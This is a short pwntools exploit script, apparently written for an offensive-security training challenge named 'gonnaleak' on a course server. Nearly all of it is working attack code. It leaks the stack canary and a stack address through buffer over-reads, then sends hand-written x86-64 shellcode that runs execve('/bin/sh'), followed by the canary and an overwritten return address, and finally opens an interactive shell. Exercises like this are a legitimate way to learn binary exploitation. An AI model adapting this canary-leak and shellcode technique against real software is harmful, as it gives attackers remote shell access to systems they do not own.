from pwn import*
import time
p = remote("bin.training.offdef.it", 2011)
#p = process(executable = "./gonnaleak",argv = [], aslr = False)


p.send(b"A"*105)

p.recvuntil(b"> ")
p.recv(105)
canary = p.recv(7)
sebp = b"A"*8

offset = 392


p.send(b"B"*152)
p.recvuntil(b"> ")
p.recv(152)
address = p.recv(8)
addr_int = int.from_bytes(address, byteorder='little')

buffer_int = addr_int - offset + 8
buffer = buffer_int.to_bytes(8, byteorder='little')


print("PROVA PROVA")
print(buffer)



#buffer = p64(0x7fffffffdeb6)

shellcode = b"\x90"*67 + b"\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBF" + buffer + b"\x48\x83\xC7\x58\x48\x31\xF6\x48\x31\xD2\x0F\x05/bin/sh\x00"
p.send(shellcode + b"\x00" + canary + sebp + buffer)


p.send("\x00")


p.interactive()